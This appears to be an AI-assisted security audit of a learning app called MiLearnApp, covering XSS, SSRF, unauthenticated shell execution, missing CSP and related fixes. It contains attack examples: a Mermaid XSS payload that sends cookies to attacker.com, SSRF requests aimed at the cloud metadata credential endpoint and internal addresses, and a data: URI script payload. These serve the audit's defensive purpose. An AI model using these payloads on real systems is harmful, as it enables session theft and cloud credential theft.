# Security Audit — MiLearnApp
**Auditor:** Ethical Hacker / Penetration Tester (AI-assisted)  
**Date:** 2026-09-09  
**Scope:** Full-stack — Vite dev API, PostgreSQL layer, React frontend, Tauri desktop shell  
**Method:** Static analysis, source code review, OWASP Top 10 mapping

---

## Executive Summary

The app has solid cryptographic foundations (AES-256-GCM, PBKDF2-600K, bcrypt) and good schema validation (Zod). However, a dead sanitizer (configured but never called), an unauthenticated SSRF endpoint, and a shell-execution route that lacks authorization represent material risks that would fail any security review before production deployment.

## 🔴 CRITICAL

---

### CVE-C1 — XSS via `dangerouslySetInnerHTML` with no sanitization
**OWASP:** A03:2021 Injection  
**Status:** ✅ Fixed in commit  
**Files:** `MermaidRenderer.tsx`, `MermaidEditorModal.tsx`, `NoteEditor.tsx`, `MathRenderer.tsx`

**Root cause:**  
`sanitizer.ts` exports a fully configured DOMPurify instance but was never imported in any component. Four `dangerouslySetInnerHTML` usages injected raw strings into the DOM.

**Attack vector:**  
A crafted Mermaid diagram block:
```
graph TD
  A["<img src=x onerror=fetch('https://attacker.com/?d='+btoa(document.cookie))>"]
```
Imported via a malicious `.milearn` backup would execute JavaScript in the user's browser context with access to all localStorage data, IndexedDB vault content, and crypto keys in memory.

**Fix applied:**
- Added `import { sanitizer } from '../services/sanitizer'` to all four components
- All `dangerouslySetInnerHTML` usages now call `sanitizer.sanitize(content)` first
- Note: KaTeX output is library-generated (not user-controlled) — KaTeX's own sanitization is sufficient there

**Additional hardening:**
- Removed `<iframe>` from DOMPurify `ALLOWED_TAGS`
- Added `afterSanitizeAttributes` hook: iframes with src not matching `youtube.com` or `vimeo.com` are removed
- Added SVG element allowlist to support Mermaid SVG output safely

### CVE-C2 — Server-Side Request Forgery (SSRF) via `/api/scrape`
**OWASP:** A10:2021 SSRF  
**Status:** ✅ Fixed in commit  
**File:** `vite.config.ts:69`

**Root cause:**  
The scrape endpoint called `fetch(userProvidedUrl)` with only a protocol check (`http://` or `https://`). No IP-range filtering.

**Attack vector:**
```bash
# Cloud: steals AWS/GCP IAM credentials
GET /api/scrape?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/default

# Local network: internal service probe
GET /api/scrape?url=http://192.168.1.1/admin
GET /api/scrape?url=http://10.0.0.1/config
```

**Fix applied:**
- RFC-1918 + loopback + link-local IP blocklist regex:
  ```
  /^(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|[::1]|0\.0\.0\.0)/i
  ```
- 8-second fetch timeout via `AbortSignal.timeout(8000)` to prevent hanging connections
- Internal error details no longer echoed to client (only generic `"Failed to scrape target URL"`)

### CVE-C3 — Unauthenticated Shell Execution via `/api/seed`
**OWASP:** A01:2021 Broken Access Control  
**Status:** ⚠️ **OPEN — requires manual action**  
**File:** `vite.config.ts:55`

**Root cause:**
```ts
const { exec } = await import('node:child_process');
exec('bun run scripts/seed.ts', ...);
```
Any HTTP client can `POST /api/seed` and trigger this shell command. No authentication, no rate limiting.

**Risk:**
- On a misconfigured or internet-exposed deployment, any attacker can wipe and reseed the database
- If `scripts/seed.ts` is ever writable by a compromised dependency, this becomes full RCE

**Recommended fix:**
```ts
// Option A: env-var secret guard
const adminSecret = req.headers['x-admin-secret'];
if (!adminSecret || adminSecret !== process.env.ADMIN_SECRET) {
  res.statusCode = 401;
  res.end(JSON.stringify({ error: 'Unauthorized' }));
  return;
}

// Option B (preferred): Remove this endpoint entirely.
// Run seeding from CLI: `bun run scripts/seed.ts`
// Never expose seed operations over HTTP.
```

### CVE-H1 — No request body size limit (memory exhaustion / DoS)
**OWASP:** A05:2021 Security Misconfiguration  
**Status:** ✅ Fixed in commit  
**File:** `vite.config.ts` (all POST routes)

**Root cause:** `body += chunk` with no length check on any of the 6 POST routes.

**Fix applied:** 5MB cap on all POST routes:
```ts
const MAX_REQUEST_BODY = 5 * 1024 * 1024;
req.on('data', chunk => {
  body += chunk;
  if (body.length > MAX_REQUEST_BODY) {
    res.statusCode = 413;
    res.end(JSON.stringify({ error: 'Payload too large (max 5MB)' }));
    req.destroy();
  }
});
```

### CVE-H2 — No authentication on any API endpoint
**OWASP:** A01:2021 Broken Access Control  
**Status:** ⚠️ **OPEN — architectural decision required**  
**File:** `vite.config.ts` (all routes)

`/api/vault` returns the full database dump. `/api/sync` accepts arbitrary write operations. `/api/db/configure` can redirect the active database connection to an attacker-controlled server. None require any token or session.

**Context:** Acceptable for local-only development. **Not acceptable** for any internet-facing deployment.

**Recommended fix for production:**
```ts
// Generate once at startup, inject into client via Vite `define`
const DEV_TOKEN = process.env.DEV_API_SECRET || crypto.randomUUID();

server.middlewares.use((req, res, next) => {
  if (!req.url?.startsWith('/api/')) return next();
  if (req.headers['x-dev-token'] !== DEV_TOKEN) {
    res.statusCode = 401;
    return res.end(JSON.stringify({ error: 'Unauthorized' }));
  }
  next();
});
```

### CVE-H3 — DOMPurify allowed unconstrained `<iframe>`
**OWASP:** A03:2021 Injection  
**Status:** ✅ Fixed in commit  
**File:** `sanitizer.ts`

`<iframe>` was in `ALLOWED_TAGS` with no `src` restriction. A note could embed an iframe pointing to a phishing page or a cross-origin frame trap.

**Fix applied:** Removed `iframe` from the allowlist. Added `afterSanitizeAttributes` hook that strips any iframe not sourced from YouTube/Vimeo.

### CVE-H4 — Tauri Content Security Policy is `null`
**OWASP:** A05:2021 Security Misconfiguration  
**Status:** ⚠️ **OPEN — requires manual action**  
**File:** `src-tauri/tauri.conf.json:25`

```json
"csp": null
```

The desktop app has no CSP. Combined with CVE-C1 (XSS), a successful XSS in the Tauri WebView has **native OS access** via Tauri's IPC bridge — it can read/write arbitrary files, execute processes, and bypass the OS sandbox.

**Fix to apply:**
```json
"security": {
  "csp": "default-src 'self'; script-src 'self'; connect-src 'self' https://*.neon.tech wss: ws:; img-src 'self' data: blob: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; object-src 'none'; base-uri 'self'; frame-src https://www.youtube.com https://vimeo.com"
}
```

## 🟡 MEDIUM

### CVE-M1 — Internal error details leaked to API client
**Status:** ✅ Partially fixed (scrape endpoint)  
PostgreSQL error messages contain schema details (table names, column names, query fragments). These should be logged server-side and never returned to clients in production.

**Recommended pattern:**
```ts
} catch (err) {
  console.error('[API Error]', err); // server log only
  res.statusCode = 500;
  res.end(JSON.stringify({ error: 'Internal server error' })); // generic to client
}
```

---

### CVE-M2 — Missing HTTP security headers
**Status:** ⚠️ **OPEN**  
`vercel.json` is missing:
- `Strict-Transport-Security` (HSTS) — allows SSL downgrade
- `Permissions-Policy` — camera/microphone/clipboard unrestricted
- `Content-Security-Policy` as an HTTP header (CSP in `index.html` only is bypassable)

**Add to `vercel.json`:**
```json
{ "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
{ "key": "Permissions-Policy", "value": "camera=(), microphone=(self), clipboard-read=(self), clipboard-write=(self)" },
{ "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; ..." }
```

---

### CVE-M3 — `sanitizeUrl` passed non-image `data:` URIs
**Status:** ✅ Fixed  
`data:text/html,<script>alert(1)</script>` was a valid URL. Now blocked.

---

### CVE-M4 — Dev server bound to `0.0.0.0`
**Status:** ⚠️ Low urgency (dev only)  
`host: '0.0.0.0'` exposes all unauthenticated API endpoints to the LAN. Change to `'127.0.0.1'` unless remote access is specifically needed.

## 🔵 LOW / INFORMATIONAL

---

### CVE-L1 — `express-rate-limit` dependency unused
Package is installed but never wired to the Vite middleware (which uses raw Node.js HTTP, not Express). Either remove it or implement a simple in-memory token bucket on `/api/scrape` and `/api/auth/hash`.

### CVE-L2 — `X-XSS-Protection` header is deprecated
This header is deprecated (Chrome removed support in 2019) and can re-enable XSS in IE. Remove from `vercel.json`. Modern XSS protection comes from a proper CSP.

### CVE-L3 — `/api/auth/hash` is an unauthenticated bcrypt oracle
Accepts any string and returns its bcrypt hash. Low risk locally; should be rate-limited or removed if the endpoint becomes internet-accessible.
